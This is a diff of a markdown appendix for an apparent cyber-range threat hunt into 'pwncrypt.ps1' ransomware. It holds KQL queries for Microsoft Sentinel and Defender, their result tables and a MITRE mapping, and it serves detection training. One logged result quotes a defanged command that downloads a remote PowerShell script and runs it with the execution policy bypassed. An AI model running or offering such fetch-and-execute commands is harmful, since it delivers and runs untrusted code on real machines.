@@ -1,20 +1,21 @@
-### Project: PwnCrypt Ransomware Project Appendix
+# Project: PwnCrypt Ransomware Project Appendix
 
-#### Summmary:
-This threat hunt was performed in Microsfot Azure and Defender XDR for End-Point. Below you'll see tables used with Sentinel (SIEM), KQL commands, and MITRE ATT&CK® Framework Mapping.
+#### Summary:
+This threat hunt was performed in Microsoft Azure and Defender XDR for End-Point. Below you'll see tables used with Sentinel (SIEM), KQL commands, and MITRE ATT&CK® Framework Mapping.
 
 #### Raw event tables used:
 
 | Table Name           | Official Documentation                                                                   |
 | :------------------- | :--------------------------------------------------------------------------------------- |
-| `DeviceNetworkEvents`| [Microsoft Learn Link](https://learn.microsoft.com/en-us/azure/azure-monitor/reference/tables/devicenetworkevents) |
-| `DeviceProcessEvents`| [Microsoft Learn Link](https://learn.microsoft.com/en-us/azure/azure-monitor/reference/tables/deviceprocessevents) |
-| `DeviceEvents`       | [Microsoft Learn Link](https://learn.microsoft.com/en-us/azure/azure-monitor/reference/tables/deviceevents)       |
-| `DeviceFileEvents`   | [Microsoft Learn Link](https://learn.microsoft.com/en-us/azure/azure-monitor/reference/tables/devicefileevents)   |
+| `DeviceNetworkEvents`| [Microsoft Learn Link](https://learn.microsoft.com/en-us/azure/azure-monitor/reference/tables/devicenetworkevents)|
+| `DeviceProcessEvents`| [Microsoft Learn Link](https://learn.microsoft.com/en-us/azure/azure-monitor/reference/tables/deviceprocessevents)|
+| `DeviceEvents`       | [Microsoft Learn Link](https://learn.microsoft.com/en-us/azure/azure-monitor/reference/tables/deviceevents)|
+| `DeviceFileEvents`   | [Microsoft Learn Link](https://learn.microsoft.com/en-us/azure/azure-monitor/reference/tables/devicefileevents)|
 
 #### KQL Appendix:
 
-#### Tracing PowerShell-Initiated pwncrypt.ps1 Download Connection
+#### 1. Tracing PowerShell-Initiated `pwncrypt.ps1` Download Connection
+
 ```kql
 let target_device = "arcwin10";
 DeviceNetworkEvents
@@ -23,7 +24,7 @@ DeviceNetworkEvents
 | where isnotempty( RemoteUrl)
 ```
 
-Query Result:
+**Query Result:**
 | Field                       | Value                                                              |
 | :-------------------------- | :----------------------------------------------------------------- |
 | Timestamp                   | May 10, 2025 2:01:44 PM                                            |
@@ -33,7 +34,9 @@ Query Result:
 | InitiatingProcessAccountName| arcanalyst1                                                      |
 | InitiatingProcessFileSize   | 455680                                                           |
 
-#### Confirming `pwncrypt.ps1` Script Execution on `arcwin10`
+--- 
+
+#### 2. Confirming `pwncrypt.ps1` Script Execution on `arcwin10`
 
 
 ```kql
@@ -48,7 +51,7 @@ DeviceProcessEvents
 | sort by Timestamp desc
 ```
 
-Query Result:
+**Query Result:**
 | Field                       | Value                                                              |
 | :-------------------------- | :----------------------------------------------------------------- |
 | Timestamp                   | May 10, 2025 2:01:44 PM                                            |
@@ -60,7 +63,9 @@ Query Result:
 | FileSize                    | 289792                                                           |
 | AdditionalFields            | {"DesktopName":"Winsta0\\Default"}                               |
 
-#### Verifying Full PowerShell Command Execution via DeviceEvents
+--- 
+
+#### 3. Verifying Full PowerShell Command Execution via DeviceEvents
 
 
 ```kql
@@ -75,7 +80,7 @@ DeviceEvents
 | sort by Timestamp asc
 ```
 
-Query Result:
+**Query Result:**
 | Field                       | Value                                                              |
 | :-------------------------- | :----------------------------------------------------------------- |
 | Timestamp                   | May 10, 2025 2:01:44 PM                                            |
@@ -86,7 +91,8 @@ Query Result:
 | InitiatingProcessParentFileName| explorer.exe                                                    |
 | AdditionalFields            | {"Command":"Invoke-WebRequest -Uri 'hxxps://raw[.]githubusercontent[.]com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt[.]ps1' -OutFile 'C:\\programdata\\pwncrypt.ps1';cmd /c powershell.exe -ExecutionPolicy Bypass -File C:\\programdata\\pwncrypt.ps1"} |
 
-#### Tracing `pwncrypt.ps1` Ransomware File Renaming Activity
+--- 
+#### 4. Tracing `pwncrypt.ps1` Ransomware File Renaming Activity
 
 ```kql
 let target_device = "arcwin10";
@@ -97,7 +103,7 @@ DeviceFileEvents
 | sort by Timestamp asc
 ```
 
-Query Result:
+**Query Result:**
 | Timestamp           | ActionType  | FileName                                   | PreviousFolderPath               | InitiatingProcessAccountName | InitiatingProcessFileName |
 | :------------------ | :---------- | :----------------------------------------- | :------------------------------- | :--------------------------- | :------------------------ |
 | May 10, 2025 2:01:45 PM | FileRenamed | 3546_CompanyFinancials_pwncrypt.csv      | C:\Users\arcanalyst1\Desktop   | arcanalyst1                | powershell.exe          |
@@ -113,6 +119,7 @@ Query Result:
 | May 10, 2025 11:13:26 PM| FileRenamed | 8762_ProjectList_pwncrypt.csv            | C:\Users\arcanalyst1\Desktop   | system                     | powershell.exe          |
 | May 10, 2025 11:13:26 PM| FileRenamed | 8357_EmployeeRecords_pwncrypt.csv        | C:\Users\arcanalyst1\Desktop   | system                     | powershell.exe          |
 
+--- 
 ### MITRE ATT&CK Framework
 
 * **Command and Control** (`TA0011`):
